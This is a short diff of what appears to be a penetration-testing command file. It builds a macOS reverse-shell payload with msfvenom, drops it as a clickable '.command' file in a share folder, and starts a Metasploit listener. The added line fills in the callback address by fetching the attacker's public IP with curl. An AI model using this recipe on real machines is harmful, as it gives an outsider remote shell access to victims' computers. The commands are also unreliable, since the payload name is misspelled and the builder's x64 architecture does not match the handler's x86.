@@ -1,4 +1,4 @@
-msfvenom -p osx/x64/shell_reverse_tco LPORT=4433 -f macho > /pentest/share/shell.command
+msfvenom -p osx/x64/shell_reverse_tco LPORT=4433 LHOST=$(curl ident.me) -f macho > /pentest/share/shell.command
 use multi/handler
 set payload osx/x86/shell_reverse_tcp  
 set LPORT 4433
